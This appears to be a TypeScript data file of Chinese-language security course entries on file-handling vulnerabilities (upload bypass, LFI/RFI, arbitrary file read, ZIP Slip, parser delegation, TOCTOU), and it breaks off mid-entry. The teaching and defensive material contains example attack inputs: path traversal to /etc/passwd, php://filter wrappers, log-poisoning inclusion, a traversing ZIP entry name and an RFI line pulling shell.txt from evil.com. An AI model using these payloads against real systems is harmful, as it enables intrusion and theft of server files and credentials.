/**
 * 文件与服务端资源 —— 6 条。内容逐字取自 docs/12 v2。
 * 6 条全为形态 B 知识卡 + 案例演示 + 指导（本主题无低档条目，故无 3 题自测）：
 * 中 4（file-upload/arbitrary-file-read/zip-slip/file-parsing）+ 高 2（file-inclusion/toctou-race）。
 * templateId：TPL-FILE×5 + toctou-race 挂 TPL-CHAIN（时序链，非单一文件控制点）。
 * 所有示例材料均为「演示样例」，非现场运行、非真实系统。
 */

import type { LearningEntry, InteractiveEntry } from './types';

const fileUpload: InteractiveEntry = {
  id: 'file-upload',
  kind: 'vuln',
  chapter: 5,
  title: '任意文件上传',
  hazard: 5,
  difficulty: 'intermediate',
  scene: ['Web', '系统'],
  aliases: ['任意文件上传', '文件上传漏洞', 'Unrestricted File Upload', '上传绕过'],
  oneLiner:
    '上传功能对文件类型、内容、存储位置控制不严时，攻击者上传可执行脚本即可获得服务器权限。',
  cause:
    '上传链路上的校验面残缺——只看前端 accept 与 JS 校验（抓包即绕）；只做后缀黑名单（php、jsp 黑名单可被 php5、phtml、Php 等变体绕过）；只校验 Content-Type（请求头可伪造）；上传后文件落在 Web 可访问且可执行的目录。为什么后缀黑名单堵不住：文件「会不会被执行」不由后缀决定，而由服务器的解析规则决定；黑名单只能列举已知后缀，解析变体列举不完——正确做法是反过来用白名单（只许业务需要的类型）加内容魔数校验（文件开头的格式指纹，如 PNG 的固定字节，认「内容是什么」而非「名字叫什么」）。',
  where:
    '头像/附件上传、模板/主题上传、报表导入、富文本图片上传、插件/扩展安装包、解压上传（联动 5.4）。',
  kinds: [
    { name: '后缀变形绕过', plain: '换后缀写法过黑名单', signal: 'a.php5、a.PhP、a.php.jpg、a.jpg.php 生效' },
    { name: 'MIME 伪造', plain: '改请求头的类型声明', signal: '只看 Content-Type 放行' },
    { name: '图片马', plain: '图片头里藏代码', signal: '图片功能实际不校验内容' },
    { name: '解析规则滥用', plain: '上传配置文件改解析', signal: '.htaccess、web.config 上传成功' },
    { name: '文件名可控', plain: '文件名参与路径构造', signal: '../../ 或绝对路径写入' },
  ],
  signals: [
    '改后缀、改 MIME、加双后缀（a.php.jpg、a.jpg.php）、加空字节 %00 截断（仅老版本 PHP 等受影响）后上传成功。',
    '上传 .htaccess / web.config 改变解析规则。',
    '图片头 + 代码的「图片」通过校验（配合文件包含或解析漏洞执行，见 5.2/5.5）。',
    '上传目录可列目录、可直接访问、可执行脚本。',
  ],
  impact:
    '可执行脚本落地 → 服务器完全沦陷（复用 webshell、rce）；上传 HTML/SVG → 存储型 XSS（复用 xss）；钓鱼页面托管在可信域名下；磁盘占满。',
  verify: [
    '先确认服务端到底校验了什么：只改后缀 / 只改 MIME / 只改文件头 / 三者都改，逐项对照。',
    '逐个绕过：后缀变形（大小写、多点、分号、空格、::$DATA 这类 Windows 流写法）、MIME 伪造、文件头伪造（如 GIF89a 文件头）、内容检测绕过（图片马）。',
    '确认上传后的路径是否可知、是否可直接访问、目录是否可执行（演示样例，无害文件验证）。',
    '确认文件名/路径是否可控（../../、绝对路径）。',
    '检查是否有图片处理环节（可联动 5.5 解析器缺陷）与解压功能（可联动 5.4）。',
  ],
  protect: {
    root: '扩展名白名单（只允许业务需要的类型）+ 文件内容魔数校验；文件名由服务端随机生成（如 UUID），原始文件名只入库展示、不参与路径构造。',
    harden: '上传目录禁止脚本执行（如 Nginx 对脚本后缀 deny all）；文件存 Web 根目录之外；上传后二次处理（图片重编码可消除图片马）；对象存储 + 独立域名 + Content-Disposition: attachment 避免同源执行。',
    fallback: '限制大小、数量、频率；恶意内容扫描。',
  },
  mistakes: [
    '只做后缀黑名单（变体列举不完）。',
    '只在前端校验（抓包即绕）。',
    '上传目录与站点同源且可执行（文件落地即中招）。',
    '忽略「文件名可控」（联动路径问题）。',
    '以为 Content-Type 校验有意义（请求头是客户端声明）。',
  ],
  terms: ['file-upload', 'file-magic', 'allowlist', 'webshell'],
  relatedTerms: ['file-magic', 'allowlist', 'webshell'],
  pinyin: { full: 'ren yi wen jian shang chuan', joined: 'renyiwenjianshangchuan', initial: 'rywjsc' },
  related: ['file-inclusion', 'path-traversal', 'webshell'],
  caseDemo: {
    material:
      '场景（演示样例，站点 example.com 的头像上传）：\n服务端校验（演示样例）：扩展名黑名单 = {php, jsp}；上传目录 /uploads/ 可执行脚本\n\n攻击步骤：\n1. 上传 shell.phtml（phtml 不在黑名单），Content-Type 改成 image/png（服务端只看后缀黑名单与请求头）\n2. 服务端保存为 /uploads/shell.phtml\n3. 访问 /uploads/shell.phtml → 服务器按解析规则把 phtml 当脚本解析执行\n\n逻辑链自查：\n输入（黑名单外后缀的可执行文件 + 伪造的 Content-Type）\n→ 机制（黑名单列举不完解析变体 + 上传目录可执行）\n→ 结果（脚本被解析执行，拿到服务器权限）✔ 每步成立',
    language: 'plaintext',
    note: '材料为演示样例，站点与文件为虚构，非现场运行、非真实系统。前提：本例假设服务器把 .phtml 也配置为 PHP 解析后缀（历史配置中常见）。若只映射 .php，则需换用其他被映射的后缀，或联动 5.5 的解析器缺陷。修法对照：白名单+魔数校验（第 1 步被拒）+ 上传目录禁执行（第 3 步不解析）+ 服务端随机文件名，三层任一到位即可断链。',
    source: 'demo',
  },
  guide: {
    why: '盯「校验了什么、放哪了、能不能执行」三件事。校验面越靠前端越假（抓包绕过）；文件名越可控越险（路径联动）；目录越像「正常目录」越危险（可执行即沦陷）。内容魔数认的是文件「实际是什么」，后缀只是「自称是什么」——两者对不上就该拒。',
    how: '① 逐项测后缀/MIME/文件头三个校验面；② 看上传后路径的可知性、可访问性、可执行性；③ 查文件名是否可控、是否联动包含/解析/解压；④ 修复按「白名单+魔数+随机名+目录禁执行+独立域」五件套。',
  },
  guideDefaultOn: true,
  stages: [],
  templateId: 'TPL-FILE',
  source: 'demo',
  format: 'interactive',
  realCases: [
    { refId: 'RC-501', summary: '任意文件上传绕过实验（成因：后缀黑名单+可执行上传目录；教训：白名单+魔数+目录禁执行）', lesson: '白名单+魔数+目录禁执行', source: 'PortSwigger Web Security Academy — File upload 实验', credibility: '平台' },
    { refId: 'RC-502', summary: 'OWASP 文件上传防护 Cheat Sheet（校验面与存储隔离规范）', lesson: '校验面与存储隔离规范', source: 'OWASP Cheat Sheet Series', credibility: '权威' },
  ],
};

const fileInclusion: InteractiveEntry = {
  id: 'file-inclusion',
  kind: 'vuln',
  chapter: 5,
  title: '文件包含（LFI / RFI）',
  hazard: 5,
  difficulty: 'advanced',
  scene: ['Web', '系统'],
  aliases: ['文件包含', 'LFI', 'RFI', '本地文件包含', '远程文件包含', 'Local File Inclusion'],
  oneLiner:
    '程序把用户输入当作「要包含的文件路径」时，攻击者借此读取本地任意文件（LFI）或加载远程恶意代码执行（RFI）——包含是「把文件内容装进程序」，比读取更危险。',
  cause:
    '页面/模块/语言/模板参数（?page=home、?lang=zh、?tpl=header）被直接拼进文件路径。为什么包含比读取更危险：读取只是把文件内容显示给你（看到即止）；包含是把文件内容当作程序的一部分装载执行——同样是拿到 passwd，包含能让「日志里的一行 payload」变成「被执行的代码」。LFI（本地包含）读本地文件、RFI（远程包含，需服务器允许远程加载）直接拉攻击者服务器上的代码。',
  where:
    '多语言/多模板站点的 page/lang/tpl/mod 参数、插件加载器、配置驱动的模块路由。',
  kinds: [
    { name: 'LFI 相对路径', plain: '../../ 走到任意文件', signal: '?page=../../../../etc/passwd 返回系统文件' },
    { name: 'LFI 伪协议', plain: '用协议包装读/执行', signal: 'php://filter 读源码、data:// 执行、phar:// 触发反序列化（复用 deserialization）' },
    { name: 'RFI 远程包含', plain: '直接拉远程代码', signal: '?page=http://evil.com/shell.txt 被装载' },
    { name: '日志/会话包含', plain: '把 payload 写进日志再包含', signal: '包含 access.log 后代码被执行' },
  ],
  signals: [
    '?page=home 这类「像文件名」的参数改成 ../../../../etc/passwd 返回系统文件内容。',
    'PHP 伪协议生效（php://filter/convert.base64-encode/resource=index.php 读到源码）。',
    'RFI：?page=http://evil.com/shell.txt 被加载（需服务器允许远程包含）。',
    '上传的图片被「当作脚本包含」执行（图片马联动 5.1）。',
  ],
  impact:
    '源码与配置泄露（数据库口令、密钥）→ 进一步远程代码执行（复用 rce）；日志包含（把 payload 写进访问日志再包含）直接命令执行；配合上传的图片马执行——单条 LFI 是信息泄露，链式才到沦陷。',
  verify: [
    '找所有「页面/模块/语言/模板」参数，观察值是否像文件名。',
    '用相对路径探测深度（../../、..\\..\\、绝对路径）。',
    '尝试伪协议读源码（演示样例，目标文件为虚构）：?page=php://filter/convert.base64-encode/resource=index.php——注意参数直通 include 时包装器必须在参数开头，找数据库凭据。',
    '尝试包含日志文件 / 会话文件 / 进程环境文件。',
    '确认服务器是否限制可访问目录、是否禁用远程包含与危险伪协议。',
  ],
  protect: {
    root: '不用用户输入拼文件路径——映射表（page=home → pages/home.php，复用访问控制与授权主题「ID 映射」思路）；白名单枚举；包含文件用绝对路径常量。',
    harden: '限制脚本可访问目录（如 PHP 的 open_basedir）；禁用危险伪协议与远程包含（allow_url_include=Off）。',
    fallback: '错误信息不回显文件内容；异常包含尝试告警。',
  },
  mistakes: [
    '只过滤 ../（编码、....//、..%2f 变体绕过——同路径穿越教训）。',
    '以为「没有回显」就没漏洞（伪协议/base64 外带照样能带出内容）。',
    '只防 LFI 不防 RFI（远程加载开关没关）。',
    '以为「只读不执行」就安全——LFI 泄露的密钥/源码是下一环的钥匙。',
  ],
  terms: ['file-inclusion', 'path-traversal', 'deserialization', 'rce'],
  relatedTerms: ['file-upload', 'path-traversal', 'deserialization'],
  pinyin: { full: 'wen jian bao han', joined: 'wenjianbaohan', initial: 'wjbh' },
  related: ['file-upload', 'path-traversal', 'deserialization'],
  caseDemo: {
    material:
      "场景（演示样例，站点 example.com 的多语言页面路由）：\n服务端逻辑（演示样例）：\n  include($_GET['page']);        ← 用户输入直接作为 include 路径（无前缀无后缀）\n\n攻击步骤：\n1. 正常请求：GET /index.php?page=home.php → 加载 home.php（正常）\n2. 越界请求：GET /index.php?page=../../../../etc/passwd\n   → include 直接装载 /etc/passwd（经路径解析读到系统文件内容）\n3. 链式升级（演示样例）：把带代码的一行写进访问日志\n   → GET /index.php?page=../../../../var/log/access.log\n   → 日志内容被「当作程序装载」，其中的代码行被执行\n4. 伪协议变体：GET /index.php?page=php://filter/convert.base64-encode/resource=index.php\n   → 读到 index.php 源码（base64 编码返回）\n\n逻辑链自查（硬标准：代码/参数与目标文件路径必须逐字符对上，包括前缀、后缀、包装器位置）：\n输入（用户可控的 page 参数，无前缀无后缀直通 include）\n→ 机制（文件内容被当作程序装载而非显示）\n→ 结果（②读到 /etc/passwd、③日志内容被执行、④伪协议读到源码）✔\n逐字符核对：page=../../../../etc/passwd → include 该路径 → 目标 /etc/passwd（无 .php 后缀拼接）✔\n           page=php://filter/convert.base64-encode/resource=index.php → 包装器在参数开头、不被前缀破坏，resource 指向磁盘上的 index.php ✔\n           page=../../../../var/log/access.log → 目标为日志文件本体 ✔",
    language: 'plaintext',
    note: '材料为演示样例，站点与路径为虚构，非现场运行、非真实系统。修法对照：映射表（第 2 步 page=.. 无对应映射被拒）+ 禁危险伪协议（第 4 步被拒）+ 限制可访问目录，链式在第 3 步前断开。',
    source: 'demo',
  },
  guide: {
    why: '盯「参数值像不像文件名」。像文件名就要问：它是被「显示」还是被「装载」——装载即包含，包含即「文件内容进程序」。单独看是信息泄露，往下想一步（日志、图片、密钥）就是执行链。',
    how: '① 盘点所有像文件名的参数；② 相对路径+伪协议+远程 URL 三类变体各试一遍（授权环境、无害目标）；③ 评估「读到的东西能带出什么」（凭据/源码/链式材料）；④ 修复按「映射表+白名单+绝对路径常量+关危险协议」四件套。',
  },
  guideDefaultOn: true,
  stages: [],
  templateId: 'TPL-FILE',
  source: 'demo',
  format: 'interactive',
  realCases: [
    { refId: 'RC-503', summary: 'OWASP 本地文件包含防护 Cheat Sheet（成因：模板参数拼 include 路径、伪协议可读源码；教训：映射表 + 禁危险伪协议 + open_basedir）', lesson: '映射表 + 禁危险伪协议 + open_basedir', source: 'OWASP Cheat Sheet Series', credibility: '权威' },
  ],
};

const arbitraryFileRead: InteractiveEntry = {
  id: 'arbitrary-file-read',
  kind: 'vuln',
  chapter: 5,
  title: '任意文件读取 / 下载',
  hazard: 4,
  difficulty: 'intermediate',
  scene: ['Web', '系统'],
  aliases: ['任意文件读取', '任意文件下载', '目录下载', 'File Download'],
  oneLiner:
    '下载接口未同时校验文件归属与目录范围时，攻击者可读取服务器任意文件或他人文件。',
  cause:
    '下载/导出接口按参数拼文件路径或按文件标识取文件，省了两道校验——① 归属：这文件归谁（同 4.1 的「ID 是门牌号不是钥匙」思路，此处门牌是文件标识）；② 目录：这文件在不在允许下载的目录白名单内。任一缺失即越界。为什么这不全是路径穿越：路径穿越只是越界的一种手法（改路径）；换他人文件 ID、猜他人文件名也能拿到文件——那是归属缺失。修「过滤 ../」只堵了一半。',
  where:
    '/download?filename=report.pdf、/export?path=/data/xxx、发票/合同/证件照下载、附件预览、备份文件下载。',
  kinds: [
    { name: '路径越界', plain: '改路径走到系统文件', signal: '../../etc/passwd、WEB-INF/web.xml 可读' },
    { name: '归属越界', plain: '换标识读他人文件', signal: '改文件 ID/文件名拿到他人发票、合同' },
    { name: '敏感文件直读', plain: '配置/密钥在可读范围', signal: '.env、application.yml、私钥可下载' },
  ],
  signals: [
    '?filename= / ?path= 参数改成越界路径后返回系统文件（/etc/passwd、WEB-INF/web.xml、application.yml、.env、私钥）。',
    '改文件 ID/业务编号后下载到他人文件（发票、合同、身份证照片）。',
    '导出接口把整个目录打成包返回。',
  ],
  impact:
    '凭据泄露、源码泄露、用户隐私数据泄露；泄露的凭据/源码是下一环的钥匙（联动认证与会话主题、访问控制与授权主题）。',
  verify: [
    '收集全部下载/导出/预览参数（文件名、路径、文件 ID、业务编号）。',
    '路径面：../ 变体、编码变体、绝对路径（同路径穿越手法，此处验证业务面）。',
    '归属面：双账号换文件标识重放（同 IDOR 手法）。',
    '确认敏感目录是否在可读范围；用文件存在性/大小差异确认读取成功。',
  ],
  protect: {
    root: '文件用 ID 映射到真实路径（用户不传路径）；下载前校验文件归属（resource.owner_id == current_user，复用 idor 的归属校验思路）。',
    harden: '路径规范化 + 目录白名单（复用 path-traversal 防护）；敏感目录不可读；批量导出逐条校验归属。',
    fallback: '下载行为审计留痕。',
  },
  mistakes: [
    '只堵 ../ 不校验归属（换 ID 照样读他人文件）。',
    '只校验归属不设目录白名单（路径越界仍在）。',
    '以为「文件名是 UUID 就安全」——难猜≠授权（IDOR 教训在文件域重演）。',
    '导出接口整包打包不逐条校验。',
  ],
  terms: ['arbitrary-file-read', 'arbitrary-rw', 'path-traversal', 'idor'],
  relatedTerms: ['path-traversal', 'idor', 'info-leak'],
  pinyin: { full: 'ren yi wen jian xia zai', joined: 'renyiwenjianxiazai', initial: 'rywjxz' },
  related: ['path-traversal', 'idor', 'file-inclusion'],
  caseDemo: {
    material:
      '场景（演示样例，站点 example.com 的发票下载）：\n本条涉及两个端点（演示样例，参数名不同、各有侧重）：\n  端点甲（归属面）：GET /invoices/download?fileId=1002  —— 按文件 ID 取文件\n  端点乙（路径面）：GET /export/download?file=report.pdf —— 按文件名/路径取文件\n\n攻击步骤：\n1. 账号 A 经端点甲正常下载自己的发票 fileId=1001（正常）\n2. 把 fileId 换成 1002（账号 B 的发票），会话不变，重放端点甲\n   → 服务端只按 ID 取文件，不查「这发票是谁的」\n   → 返回 B 的发票（归属校验缺失）\n3. 路径面变体（演示样例）：端点乙 GET /export/download?file=../../etc/passwd\n   → 拼接越界、无目录白名单 → 返回系统文件（目录校验缺失）\n\n逻辑链自查：\n输入（换他人文件标识 / 路径带 ../）\n→ 机制（归属校验与目录白名单两道都缺）\n→ 结果（读到他人文件 / 限定范围外系统文件）✔ 每步成立',
    language: 'plaintext',
    note: '材料为演示样例，站点与文件为虚构，非现场运行、非真实系统。修法对照：归属校验（第 2 步被拒）+ ID 映射+目录白名单（第 3 步被拒）——两道都要修，修一道漏一道。',
    source: 'demo',
  },
  guide: {
    why: '下载是「文件出站」的口子，两道锁都要在：这文件是不是你的（归属）、这文件该不该被下载（目录）。少一道就漏——换 ID 漏归属、改路径漏目录。与路径穿越的分工：路径穿越讲穿越机制，本条讲下载业务面「两道校验并存」。',
    how: '① 盘点下载/导出/预览参数；② 路径面与归属面分开测（../ 变体 / 换标识）；③ 查敏感目录是否在可读范围；④ 修复按「ID 映射 + 归属校验 + 目录白名单」三件套，缺一不可。',
  },
  guideDefaultOn: true,
  stages: [],
  templateId: 'TPL-FILE',
  source: 'demo',
  format: 'interactive',
  realCases: [
    { refId: 'RC-504', summary: '文件下载越权/越界实验（成因：下载参数拼路径 + 缺归属校验；教训：ID 映射 + 归属 + 目录白名单）', lesson: 'ID 映射 + 归属 + 目录白名单', source: 'PortSwigger Web Security Academy — Access control / 文件下载实验', credibility: '平台' },
  ],
};

const zipSlip: InteractiveEntry = {
  id: 'zip-slip',
  kind: 'vuln',
  chapter: 5,
  title: 'ZIP Slip / 解压路径穿越',
  hazard: 4,
  difficulty: 'intermediate',
  scene: ['Web', '系统'],
  aliases: ['ZIP Slip', '解压路径穿越', '压缩包穿越', '解压漏洞'],
  oneLiner:
    '解压时不校验压缩包内条目名，含 ../ 的条目会被写到目标目录之外，覆盖配置或写入可执行文件。',
  cause:
    '解压器把条目名直接拼到目标目录后写盘。压缩包内的文件名是用户数据——攻击者可以把 ../../../../var/www/shell.jsp 这样的名字放进包里，解压时文件被写到目标目录之外。为什么解压要逐条目校验：压缩包的「文件名」和上传的「文件名」一样都是用户控制的输入；解压器只是「照单落盘」，不问这个名字要去哪——每解出一个文件前，都要先规范化这个条目路径、确认它在目标目录内。',
  where: '主题/模板包导入、插件安装包、备份恢复、批量文件上传的解压环节、日志包/数据包导入。',
  kinds: [
    { name: '穿越写入', plain: '条目名带 ../ 写出目录', signal: '解压后目标目录外出现文件' },
    { name: '覆盖攻击', plain: '写到关键位置覆盖配置', signal: '配置/脚本被包内同名条目覆盖' },
    { name: '解压炸弹', plain: '超大解压占满磁盘', signal: '小包解出巨量文件（限幅联动）' },
  ],
  signals: [
    '上传 zip 后解压；压缩包内文件名形如 ../../../../var/www/shell.jsp。',
    '解压后在目标目录之外出现文件；关键配置被覆盖。',
  ],
  impact: '覆盖配置（改解析规则、改权限）；写入可执行文件（联动 5.1 成 WebShell）；解压炸弹占满磁盘拒绝服务。',
  verify: [
    '构造带 ../ 条目名的测试压缩包（演示样例，写入无害标记文件）。',
    '上传并解压，检查目标目录外是否出现文件、是否覆盖同名文件。',
    '测试绝对路径条目名（/etc/cron.d/x 类写入位置，授权环境）。',
    '测试解压总大小与文件数限制（防解压炸弹）。',
  ],
  protect: {
    root: '解压前逐条目规范化路径并校验是否在目标目录内（复用 path-traversal 的规范化+白名单思路）；拒绝绝对路径与 ..。',
    harden: '限制解压总大小与文件数（防解压炸弹）；解压后不保留可执行权限；解压到隔离临时区再校验（联动 5.6）。',
    fallback: '解压审计留痕。',
  },
  mistakes: [
    '只校验压缩包本身「是不是 zip」，不看条目名。',
    '校验了首条条目、其余条目放行（同 IDOR「批量逐条校验」教训）。',
    '忽略解压炸弹（大小/数量没限）。',
    '以为「解压到临时目录就安全」——临时目录可写可执行照样中招（联动 5.6）。',
  ],
  terms: ['zip-slip', 'file-upload', 'path-traversal', 'allowlist'],
  relatedTerms: ['file-upload', 'path-traversal', 'temp-file'],
  pinyin: { full: 'jie ya lu jing chuan yue', joined: 'jieyalujingchuanyue', initial: 'jyljcy' },
  related: ['path-traversal', 'file-upload', 'temp-file'],
  caseDemo: {
    material:
      '场景（演示样例，站点 example.com 的主题包导入）：\n服务端逻辑（演示样例）：解压上传的 zip 到 /var/www/themes/，不校验条目名\n\n攻击步骤：\n1. 构造 zip（演示样例），内含一个条目：\n   条目名 = ../../../../var/www/shell.jsp\n2. 上传并触发解压\n3. 解压器把条目名拼到目标目录后写盘：\n   /var/www/themes/ + ../../../../var/www/shell.jsp\n   → 解析为 /var/www/shell.jsp，写出目标目录之外\n4. 访问 /var/www/shell.jsp → 可执行脚本落地（联动 5.1 的后果）\n\n逻辑链自查：\n输入（条目名带 ../ 的压缩包）\n→ 机制（解压器照单落盘，条目路径未规范化未校验）\n→ 结果（文件写出目标目录，覆盖/写入可执行文件）✔ 每步成立',
    language: 'plaintext',
    note: '材料为演示样例，站点与压缩包为虚构，非现场运行、非真实系统。修法对照：逐条目规范化+目录校验（第 3 步条目被拒）+ 不保留可执行权限（第 4 步不可执行）。',
    source: 'demo',
  },
  guide: {
    why: '盯「压缩包里的文件名」——它和上传文件名一样是用户数据，只是藏在包里。解压器「照单落盘」不问去向时，../ 就从请求参数躲进了包里。每解出一个文件前先规范化这个条目路径，是唯一堵法。',
    how: '① 找所有解压入口（主题/插件/备份/批量）；② 构造带 ../ 条目名的测试包验证写出位置；③ 查大小/数量限幅；④ 修复按「逐条目规范化+目录校验+限幅+去执行位」四件套。',
  },
  guideDefaultOn: true,
  stages: [],
  templateId: 'TPL-FILE',
  source: 'demo',
  format: 'interactive',
  realCases: [
    { refId: 'RC-505', summary: 'ZIP Slip 解压路径穿越公开研究（成因：解压不校验条目名；教训：逐条目规范化+目录校验）', lesson: '逐条目规范化+目录校验', source: 'Snyk — ZIP Slip 研究公告', credibility: '平台' },
  ],
};

const fileParsing: InteractiveEntry = {
  id: 'file-parsing',
  kind: 'vuln',
  chapter: 5,
  title: '文件解析与预览类漏洞',
  hazard: 4,
  difficulty: 'intermediate',
  scene: ['Web', '系统'],
  aliases: ['文件解析漏洞', '解析器漏洞', '预览转换漏洞', 'ImageMagick', '文档转换'],
  oneLiner:
    '文档/图片/媒体的解析器处理攻击者构造的文件时触发缺陷或危险委托，即可执行命令。',
  cause:
    '上传后自动生成缩略图/预览/转换 PDF 的环节，调用解析器（ImageMagick、LibreOffice、PDF 渲染、Office 转换服务）处理用户文件。解析器为支持多格式会「委托」外部处理——为什么解析图片也能执行命令：解析器不是只「看」图片，它为了支持各种格式（矢量图、外链、宏）会调用外部程序处理；文件里可以写着「去执行某某命令」的指令，解析器照做——解析 = 信任文件内容里的指令，和注入「信任用户输入」是同一类错误，只是信的是文件。历史上如 ImageMagick 的委托缺陷（ImageTragick 类）就是「图片里写指令、解析器执行」。',
  where:
    '头像缩略图生成、文档预览/转 PDF、Office 转换服务、媒体转码（convert、ffmpeg、soffice 等外部命令调用处）。',
  kinds: [
    { name: '委托执行', plain: '文件里写指令、解析器照做', signal: '矢量图/外链处理触发外部程序' },
    { name: '解析器缺陷', plain: '特定格式触发解析器漏洞', signal: '恶意文件致解析器崩溃/执行' },
    { name: '命令拼接', plain: '文件名/参数拼进外部命令', signal: '转换命令里出现用户数据' },
  ],
  signals: [
    '上传后自动生成缩略图/预览/转换 PDF。',
    '处理链路使用 convert、ffmpeg、soffice 等外部命令。',
    '解析器版本老旧、危险格式/委托未禁用（如 ImageMagick 的 MSL/SVG/MVG 委托未关）。',
  ],
  impact: '处理恶意文件即远程代码执行（复用 rce）；服务横向（转换服务常有内网访问权）；拒绝服务（畸形文件拖垮解析器）。',
  verify: [
    '盘点所有「上传后自动处理」的环节（缩略图、预览、转换、转码）。',
    '确认处理链路调用的解析器与版本、是否走外部命令、命令行是否含用户数据。',
    '在授权环境用公开的畸形测试样本验证解析器行为（演示样例，无害样本）。',
    '检查处理是否沙箱化（网络、权限、文件系统边界）。',
  ],
  protect: {
    root: '处理在沙箱/容器内进行（无网络、非 root、只读挂载，复用 sandbox）；禁用危险委托（如 ImageMagick 配置里关闭 URL/MSL 类委托）。',
    harden: '及时升级解析器；限制处理时间与内存；避免 shell 调用外部命令（参数数组传参，同命令注入主题的根治思路）。',
    fallback: '处理失败快速失败并告警；文件内容扫描。',
  },
  mistakes: [
    '以为「只是生成缩略图」无风险——处理即信任文件内容。',
    '只升级解析器不关危险委托（配置面没收紧）。',
    '处理服务权限过大（可访问内网/密钥）。',
    '命令行拼接文件名（联动注入类主题的命令注入）。',
  ],
  terms: ['file-parsing', 'file-upload', 'sandbox', 'rce'],
  relatedTerms: ['file-upload', 'file-inclusion', 'sandbox'],
  pinyin: { full: 'wen jian jie xi lou dong', joined: 'wenjianjiexiloudong', initial: 'wjjxld' },
  related: ['file-upload', 'file-inclusion', 'sandbox'],
  caseDemo: {
    material:
      '场景（演示样例，站点 example.com 的头像缩略图）：\n服务端逻辑（演示样例）：\n  上传图片 → 调用外部命令生成缩略图：\n  convert <用户文件> /thumbs/<随机名>.png\n  （ImageMagick，配置里危险委托未禁用）\n\n攻击步骤：\n1. 上传一个构造的图片（演示样例），文件内容里含触发解析器危险委托的指令\n   （ImageTragick 类机制：图片格式可携带「执行外部程序」的指令）\n2. 服务端处理该文件 → 解析器读到文件里的委托指令 → 执行外部程序\n3. 指令在服务器上生效（演示样例，无害验证命令）\n\n逻辑链自查：\n输入（内容含委托指令的图片）\n→ 机制（解析器为支持格式会执行文件指定的外部处理，委托未禁用）\n→ 结果（处理文件时服务器执行了命令）✔ 每步成立',
    language: 'plaintext',
    note: '材料为演示样例，站点与文件为虚构、指令为无害验证，非现场运行、非真实系统；效果依赖解析器具体缺陷/危险配置（如历史 ImageTragick 类委托问题），修法对照：沙箱化处理（第 2 步命令被沙箱限制）+ 禁危险委托（第 2 步委托被拒）+ 升级（缺陷修复）。',
    source: 'demo',
  },
  guide: {
    why: '盯「上传后有没有自动处理」。一旦有（缩略图/预览/转换），就问：解析器信不信文件内容里的指令。解析不是「只看」——为支持多格式它会执行文件指定的处理。和注入同一类错误：信了不该信的数据，只是数据藏在文件里。',
    how: '① 盘点自动处理环节与所用解析器/版本；② 查外部命令调用方式（是否 shell 拼接）与危险委托开关；③ 查处理是否沙箱化；④ 修复按「沙箱化+禁委托+升级+限资源」四件套。',
  },
  guideDefaultOn: true,
  stages: [],
  templateId: 'TPL-FILE',
  source: 'demo',
  format: 'interactive',
  realCases: [
    { refId: 'RC-506', summary: 'ImageMagick 委托执行缺陷（CVE-2016-3714，即 ImageTragick，成因：图片格式可携带外部处理指令且委托未禁用；教训：沙箱化处理 + 关闭危险委托）', lesson: '沙箱化处理 + 关闭危险委托', source: 'NVD / CVE 公开记录', credibility: '权威' },
  ],
};

const toctouRace: InteractiveEntry = {
  id: 'toctou-race',
  kind: 'vuln',
  chapter: 5,
  title: '临时文件与竞争条件',
  hazard: 3,
  difficulty: 'advanced',
  scene: ['Web', '系统'],
  aliases: ['竞争条件', 'TOCTOU', '临时文件漏洞', 'Time-of-check to Time-of-use', '竞态'],
  oneLiner:
    '临时文件命名可预测、权限过宽，或「检查」与「使用」之间存在时间窗（TOCTOU）时，文件可被替换或读取。',
  cause:
    '处理文件分两步——先「检查」（扫毒/校验内容）后「使用」（移动到正式目录/执行）。两步不是原子的，中间有时间窗；窗口内文件可被替换（同进程的另一线程、同主机的另一请求、共享临时目录的他人）。为什么「检查过」不等于「用的还是检查过的那个」：检查的和使用的若不是同一次读取，中间隔的时间够换人——像安检后到登机口之间，行李被调包。TOCTOU（检查与使用之间的时序差）就是这个窗口的名字；临时文件命名可预测、权限过宽则让「换人」更容易。攻击前提：攻击者需具备「同路径写文件」的能力——同应用的另一个可写接口、或共享主机上的本地用户；若临时目录带粘滞位且文件名不可预测，此链即被阻断（正是修法所在）。',
  where:
    '上传「先扫毒再落正式目录」流程、临时目录共享的处理链路、可预测临时文件名的生成处、解压到临时区再移动的流程（联动 5.4）。',
  kinds: [
    { name: '检查-使用竞态', plain: '扫毒与落盘之间被替换', signal: '恶意内容绕过扫描生效' },
    { name: '临时文件可预测', plain: '名字能猜到', signal: '顺序/时间戳命名的临时文件' },
    { name: '临时文件权限宽', plain: '他人可读可写', signal: '临时目录权限过宽、未设创建时权限' },
  ],
  signals: [
    '「先检查再移动/使用」两步分离、无原子操作。',
    '临时文件命名可预测（顺序号、时间戳）；权限在创建后才设置。',
    '多请求并发下结果不一致（竞态可观测面）。',
  ],
  impact: '恶意文件绕过检查落地（等同 5.1 后果）；临时文件被替换/窃取；敏感中间文件泄露（复用 info-leak）。',
  verify: [
    '盘点「检查→使用」两步的处理流程（扫毒后移动、校验后执行、解压后处理）。',
    '构造并发请求（演示样例，多线程同时触发），尝试在窗口内替换临时文件。',
    '检查临时文件命名规律、创建时权限、临时目录共享范围。',
    '确认「检查」与「使用」是否同一读取（哈希比对、原子移动）。',
  ],
  protect: {
    root: '先写入只有服务端可访问的私有目录、使用不可预测的文件名（安全临时文件 API 如 mkstemp、Files.createTempFile，创建时即设权限），再以原子 rename 移入正式目录；检查基于同一文件句柄——避免「先检查再使用」的分离。',
    harden: '上传先落隔离临时区、校验后以原子 rename 移入正式目录；临时目录私有、最小权限、粘滞位。',
    fallback: '并发异常告警；临时文件超时清理。',
  },
  mistakes: [
    '以为「扫过毒就安全」——扫毒与落盘之间有窗口。',
    '临时文件名可预测（顺序/时间戳）。',
    '权限后设（创建时默认宽权限）。',
    '用「再检查一遍」缓解竞态——不原子，只是把窗口变短。',
  ],
  terms: ['toctou-race', 'toctou', 'temp-file', 'file-upload'],
  relatedTerms: ['toctou', 'temp-file', 'sandbox'],
  pinyin: { full: 'lin shi wen jian jing zheng tiao jian', joined: 'linshiwenjianjingzhengtiaojian', initial: 'lswjjztj' },
  related: ['zip-slip', 'file-upload', 'temp-file'],
  caseDemo: {
    material:
